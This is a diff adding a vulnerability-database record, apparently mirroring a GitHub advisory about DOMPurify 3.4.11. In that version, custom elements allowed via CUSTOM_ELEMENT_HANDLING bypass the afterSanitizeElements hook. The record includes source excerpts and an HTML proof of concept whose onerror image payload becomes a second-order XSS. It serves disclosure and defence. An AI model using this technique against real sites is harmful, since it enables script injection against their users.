@@ -1,0 +1,270 @@
+[basic]
+description = '''
+## Summary
+
+There is a possible hook-policy inconsistency in DOMPurify 3.4.11 involving `CUSTOM_ELEMENT_HANDLING`.
+
+When a custom element is allowed via `CUSTOM_ELEMENT_HANDLING.tagNameCheck`, it appears that the element does not go through `afterSanitizeElements` in the same way as a normal element. As a result, an application that relies on `afterSanitizeElements` as a security policy layer to strip sensitive attributes from all elements may see those attributes removed from normal elements but preserved on allowed custom elements.
+
+This does not appear to be a direct DOMPurify XSS or a case where DOMPurify directly allows executable payloads. The preserved value is still inert at sanitize time. The issue becomes relevant when the allowed custom element later re-injects that attribute value into an HTML sink such as `innerHTML`, creating a second-order XSS gadget.
+
+## Details
+
+The issue appears to originate from the control flow in `src/purify.ts`: line 1672~1691
+
+```tsx
+const _sanitizeDisallowedNode = function (
+    currentNode: any,
+    tagName: string
+  ): boolean {
+    /* Check if we have a custom element to handle */
+    if (!FORBID_TAGS[tagName] && _isBasicCustomElement(tagName)) {
+      if (
+        CUSTOM_ELEMENT_HANDLING.tagNameCheck instanceof RegExp &&
+        regExpTest(CUSTOM_ELEMENT_HANDLING.tagNameCheck, tagName)
+      ) {
+        return false;
+      }
+
+      if (
+        CUSTOM_ELEMENT_HANDLING.tagNameCheck instanceof Function &&
+        CUSTOM_ELEMENT_HANDLING.tagNameCheck(tagName)
+      ) {
+        return false;
+      }
+    }
+```
+
+`CUSTOM_ELEMENT_HANDLING` is parsed from user configuration at `src/purify.ts`: line 741~748
+
+```tsx
+const customElementHandling =
+      objectHasOwnProperty(cfg, 'CUSTOM_ELEMENT_HANDLING') &&
+      cfg.CUSTOM_ELEMENT_HANDLING &&
+      typeof cfg.CUSTOM_ELEMENT_HANDLING === 'object'
+        ? clone(cfg.CUSTOM_ELEMENT_HANDLING)
+        : create(null);
+
+    CUSTOM_ELEMENT_HANDLING = create(null);
+```
+
+In particular, `tagNameCheck`, `attributeNameCheck`, and `allowCustomizedBuiltInElements` are copied into the internal `CUSTOM_ELEMENT_HANDLING` object there.
+
+During element sanitization, `_sanitizeElements()` checks whether a node is forbidden or not allowlisted at `src/purify.ts`: line 1805~1814
+
+```tsx
+/* Remove element if anything forbids its presence */
+    if (
+      FORBID_TAGS[tagName] ||
+      (!(
+        EXTRA_ELEMENT_HANDLING.tagCheck instanceof Function &&
+        EXTRA_ELEMENT_HANDLING.tagCheck(tagName)
+      ) &&
+        !ALLOWED_TAGS[tagName])
+    ) {
+      return _sanitizeDisallowedNode(currentNode, tagName);
+    }
+```
+
+If so, it immediately delegates to `_sanitizeDisallowedNode(currentNode, tagName)` and returns its boolean result.
+
+Inside `_sanitizeDisallowedNode()`, the custom-element-specific allow path is implemented at `src/purify.ts`: line 1672~1692
+
+```tsx
+const _sanitizeDisallowedNode = function (
+    currentNode: any,
+    tagName: string
+  ): boolean {
+    /* Check if we have a custom element to handle */
+    if (!FORBID_TAGS[tagName] && _isBasicCustomElement(tagName)) {
+      if (
+        CUSTOM_ELEMENT_HANDLING.tagNameCheck instanceof RegExp &&
+        regExpTest(CUSTOM_ELEMENT_HANDLING.tagNameCheck, tagName)
+      ) {
+        return false;
+      }
+
+      if (
+        CUSTOM_ELEMENT_HANDLING.tagNameCheck instanceof Function &&
+        CUSTOM_ELEMENT_HANDLING.tagNameCheck(tagName)
+      ) {
+        return false;
+      }
+    }
+```
+
+If the node is treated as a basic custom element and `CUSTOM_ELEMENT_HANDLING.tagNameCheck` matches, the function returns `false` immediately at line 1682 or 1689, meaning “do not remove this node”.
+
+That early `return false` is significant because control returns directly to `_sanitizeElements()` via the `return _sanitizeDisallowedNode(...)` at line 1813. As a result, the later logic in `_sanitizeElements()` is skipped for that custom element instance, including:
+
+- the namespace validation at `src/purify.ts`: line 1816~1826
+
+```tsx
+* Check whether element has a valid namespace.
+       Realm-safe check (GHSA-hpcv-96wg-7vj8): use the cached Node.prototype
+       nodeType getter rather than `instanceof Element`, which is realm-
+       bound and short-circuits to false for any node minted in a different
+       realm — letting a foreign-realm element with a forbidden namespace
+       slip past the namespace check entirely. */
+    const nt = getNodeType ? getNodeType(currentNode) : currentNode.nodeType;
+    if (nt === NODE_TYPE.element && !_checkValidNamespace(currentNode)) {
+      _forceRemove(currentNode);
+      return true;
+    }
+```
+
+- the fallback-tag mXSS check at `src/purify.ts`: line 1828~1837
+
+```tsx
+/* Make sure that older browsers don't get fallback-tag mXSS */
+    if (
+      (tagName === 'noscript' ||
+        tagName === 'noembed' ||
+        tagName === 'noframes') &&
+      regExpTest(EXPRESSIONS.FALLBACK_TAG_CLOSE, currentNode.innerHTML)
+    ) {
+      _forceRemove(currentNode);
+      return true;
+    }
+```
+
+- most importantly for this report, the `afterSanitizeElements` hook dispatch at `src/purify.ts`: line 1850~1851.
+
+```tsx
+   /* Execute a hook if present */
+    _executeHooks(hooks.afterSanitizeElements, currentNode, null);
+```
+
+In other words, a normal allowlisted element continues through `_sanitizeElements()` and reaches `hooks.afterSanitizeElements`, but a disallowed-by-default element that is revived by the `CUSTOM_ELEMENT_HANDLING.tagNameCheck` path does not. This creates a policy inconsistency: an application that relies on `afterSanitizeElements` to remove an attribute from all elements will observe that the policy is applied to normal elements but not to custom elements allowed through `CUSTOM_ELEMENT_HANDLING`.
+
+In the PoC, the application hook removes `data-bio` from ordinary elements, but the same attribute remains on `<x-bio>` because the custom-element keep path bypasses `afterSanitizeElements`. The attribute itself is inert at sanitize time and DOMPurify is not directly allowing executable SVG/HTML through. The security impact appears when the application-defined custom element later reads the preserved `data-bio` value in `connectedCallback()` and writes it to `innerHTML`, turning the preserved attribute into a second-order XSS gadget.
+
+## PoC
+
+Reproduced on DOMPurify 3.4.11.
+
+### Steps
+
+1. Save the following HTML to a file, for example `poc.html`.
+2. Open it in a browser.
+3. Observe that the `div` control loses `data-bio`, while the allowed custom element keeps it.
+4. Observe that after `connectedCallback()` runs, the candidate payload is reinserted into the DOM and executes through the custom element’s own sink.
+
+### HTML PoC
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset=\"UTF-8\">
+  <script src=\"https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.4.11/purify.min.js\"></script>
+</head>
+<body>
+<pre id=\"result\"></pre>
+
+<script>
+window.__controlFired = false;
+window.__candidateFired = false;
+
+customElements.define(\"x-bio\", class extends HTMLElement {
+  connectedCallback() {
+    const bio = this.getAttribute(\"data-bio\");
+    if (bio) this.innerHTML = bio;
+  }
+});
+
+DOMPurify.addHook(\"afterSanitizeElements\", node => {
+  if (node.hasAttribute && node.hasAttribute(\"data-bio\")) {
+    node.removeAttribute(\"data-bio\");
+  }
+});
+
+const config = {
+  CUSTOM_ELEMENT_HANDLING: {
+    tagNameCheck: /^x-/
+  }
+};
+
+const controlInput =
+  '<div data-bio=\"&lt;img src=x onerror=window.__controlFired=true&gt;\"></div>';
+
+const candidateInput =
+  '<x-bio data-bio=\"&lt;img src=x onerror=window.__candidateFired=true&gt;\"></x-bio>';
+
+const cleanControl = DOMPurify.sanitize(controlInput, config);
+const cleanCandidate = DOMPurify.sanitize(candidateInput, config);
+
+const container = document.createElement(\"div\");
+container.innerHTML = cleanCandidate;
+document.body.appendChild(container);
+
+setTimeout(() => {
+  document.getElementById(\"result\").textContent =
+    \"This is not direct DOMPurify XSS.\n\" +
+    \"The payload becomes executable only after x-bio writes data-bio into innerHTML.\n\n\" +
+    \"control: \" + cleanControl + \"\n\" +
+    \"candidate: \" + cleanCandidate + \"\n\" +
+    \"after connectedCallback: \" + container.innerHTML + \"\n\" +
+    \"control fired: \" + window.__controlFired + \"\n\" +
+    \"candidate fired: \" + window.__candidateFired;
+}, 100);
+</script>
+</body>
+</html>
+```
+
+### Expected result
+
+```
+control: <div></div>
+candidate: <x-bio data-bio=\"<img src=x onerror=window.__candidateFired=true>\"></x-bio>
+after connectedCallback: <x-bio data-bio=\"...\"><img src=\"x\" onerror=\"window.__candidateFired=true\"></x-bio>
+control fired: false
+candidate fired: true
+```
+
+This is output of HTML PoC.
+
+<img width=\"1917\" height=\"961\" alt=\"poc\" src=\"https://github.com/user-attachments/assets/80e22989-5779-42f8-8ffb-106e9a4c2b10\" />
+
+
+## Impact
+
+This does not appear to affect DOMPurify’s default configuration as a direct sanitizer bypass.
+
+The impact is limited to applications that:
+
+- enable `CUSTOM_ELEMENT_HANDLING`,
+- rely on `afterSanitizeElements` as a security policy layer,
+- expect that hook to apply uniformly to all surviving elements,
+- and have allowed custom elements that later re-inject preserved attribute values into `innerHTML` or another HTML sink.
+
+In that situation, the behavior can become a second-order XSS gadget because a security-relevant attribute is removed from normal elements but remains on allowed custom elements.
+
+Possible fixes or mitigations might include
+
+- ensuring that allowed custom elements also consistently pass through `afterSanitizeElements`
+- documenting clearly that elements preserved via `CUSTOM_ELEMENT_HANDLING` may not participate in the same post-element hook flow as normal allowlisted elements.
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "DOMPurify: `CUSTOM_ELEMENT_HANDLING` bypasses `afterSanitizeElements` for allowed custom elements."
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-c2j3-45gr-mqc4"]
+ave_id = "AVE-2026-1064"
+
+[meta]
+collected_at = "2026-08-06T00:26:24.922873743+00:00"
+status = "completed"
+
+[references]
+urls = []
